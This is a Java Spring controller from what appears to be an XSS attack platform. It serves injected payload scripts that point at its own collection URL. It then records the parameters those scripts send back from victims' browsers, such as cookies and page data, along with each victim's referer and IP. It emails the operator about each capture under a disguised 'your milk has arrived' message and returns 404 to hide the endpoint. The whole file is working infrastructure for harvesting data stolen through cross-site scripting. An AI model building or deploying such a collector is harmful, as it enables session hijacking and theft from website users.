package com.xss.web.controllers;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import com.xss.web.base.cache.CacheFinal;
import com.xss.web.cache.EmailCache;
import com.xss.web.cache.LetterCache;
import com.xss.web.cache.ModuleCache;
import com.xss.web.cache.ProjectCache;
import com.xss.web.cache.UserCache;
import com.xss.web.controllers.base.BaseController;
import com.xss.web.model.Email;
import com.xss.web.model.Letter;
import com.xss.web.model.LetterParas;
import com.xss.web.model.Module;
import com.xss.web.model.Project;
import com.xss.web.model.User;
import com.xss.web.util.EmailSenderUtil;
import com.xss.web.util.EncryptionUtil;
import com.xss.web.util.JUUIDUtil;
import com.xss.web.util.PropertUtil;
import com.xss.web.util.RequestUtil;
import com.xss.web.util.StringUtils;

@Controller
public class SController extends BaseController {
	@Resource
	ProjectCache projectCache;
	@Resource
	ModuleCache moduleCache;
	@Resource
	LetterCache letterCache;
	@Resource
	EmailCache emailCache;
	@Resource
	UserCache userCache;

	@RequestMapping
	public void index(HttpServletRequest req, HttpServletResponse res) {
	}

	@RequestMapping(value = { "/{id:\\d+}" })
	public void xssContext(HttpServletRequest req, HttpServletResponse res,
			@PathVariable Integer id) {
		Project project = projectCache.getProject(id);
		if (StringUtils.isNullOrEmpty(project)
				|| StringUtils.isNullOrEmpty(project.getModule())) {
			return;
		}
		Module module = moduleCache.getModule(project.getModule().getId());
		if (StringUtils.isNullOrEmpty(module)) {
			return;
		}
		String api = loadBasePath(req) + "s/" + "api_" + project.getId() + "."
				+ getDefSuffix();
		String xmlCode = module.getContent().replace("{api}", api);
		print(res, xmlCode);
	}

	@RequestMapping(value = { "api_{id:\\d+}" })
	public void api(HttpServletRequest req, HttpServletResponse res,
			@PathVariable final Integer id) {
		// 过滤来源地址
		final Map<String, String> paraMap = getParas();
		final String referer = req.getHeader("Referer");
		final String ip = RequestUtil.getIpAddr(req);
		final String basePath = StringUtils.toString(getAttribute("basePath"));
		Project project = projectCache.getProject(id);
		try {
			doApi(paraMap, referer, ip, project, basePath);
		} catch (Exception e) {
		}
		res.setStatus(404);
	}

	private void doApi(Map<String, String> paraMap, String referer, String ip,
			Project project, String basePath) {
		System.out.println("API收到参数:" + paraMap);
		if (!StringUtils.isNullOrEmpty(referer)) {
			if (!StringUtils.isNullOrEmpty(project.getFilter())) {
				if (project.getFilter().indexOf(referer) > -1) {
					return;
				}
			}
		}
		// 检查参数
		if (StringUtils.isNullOrEmpty(paraMap)) {
			return;
		}
		String uuStr = paraMap.toString();
		toSave(paraMap, uuStr, project, referer, ip, basePath);
	}

	@SuppressWarnings({ "unchecked"})
	private void toSave(Map<String, String> paraMap, String uuStr,
			Project project, String referer, String ip, String basePath) {
		String md5 = EncryptionUtil.md5Code(uuStr);
		Letter tmp = letterCache.findLetter(md5);
		if (!StringUtils.isNullOrEmpty(tmp)) {
			return;
		}
		String uuid = JUUIDUtil.createUuid();
		Letter letter = new Letter();
		letter.setUuid(uuid);
		letter.setProject(project);
		letter.setRefUrl(referer);
		letter.setUpdateTime(new Date());
		letter.setUuid(uuid);
		letter.setContext(md5);
		letter.setIp(ip);
		letterCache.save(letter);
		// 刷新信封信息
		letter = letterCache.getLetter(uuid);
		List<LetterParas> parasList = new ArrayList<LetterParas>();
		LetterParas paras = null;
		for (String key : paraMap.keySet()) {
			paras = new LetterParas();
			paras.setParaName(key);
			paras.setParaValue(paraMap.get(key));
			paras.setUpdateTime(new Date());
			paras.setLetter(letter);
			parasList.add(paras);
		}
		letterCache.batchSaveLeter(parasList, project);
		if (!StringUtils.isNullOrEmpty(project.getOpenEmail())
				&& project.getOpenEmail() == 1) {
			try {
				parasList = (List<LetterParas>) PropertUtil.setFieldValue(
						parasList, "letter", null);
				User user = userCache.getUser(project.getUser().getId());
				sendEmail(user.getEmail(), letter, parasList, basePath);
			} catch (Exception e) {
				e.printStackTrace();
			}

		}
	}

	private void sendEmail(final String targeEmail, final Letter letter,
			final List<LetterParas> parasList, String basePath) {
		final List<Email> emails = emailCache.loadEmails();
		StringBuilder sb = new StringBuilder();
		sb.append("商品来源:").append(letter.getRefUrl()).append("\r\n");
		sb.append("商家身份:").append(letter.getIp()).append("\r\n");
		sb.append("\r\n\r\n您购买的牛奶已经到货,请登录").append(basePath).append(" 查看");
		final String msg = sb.toString();
		if (!StringUtils.isNullOrEmpty(emails)) {
			String key = CacheFinal.EMAIL_SEND_KEY.toString() + targeEmail;
			String status = (String) baseCache.getCache(key);
			if (status != null) {
				return;
			}
			baseCache.addCache(key, "1", 30);
			try {
				emailSenderUtil.send(emails, "XssAPP(" + letter.getRefUrl()
						+ ")", msg, targeEmail);
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				baseCache.removeCache(key);
			}
		}
	}

	@Resource
	EmailSenderUtil emailSenderUtil;

	public static void main(String[] args) {
		for (int i = 0; i < 10; i++) {
			Map<String, String> map = new HashMap<String, String>();
			map.put("abcd", "1234");
			String str = map.toString();
			System.out.println(str);
		}

	}
}
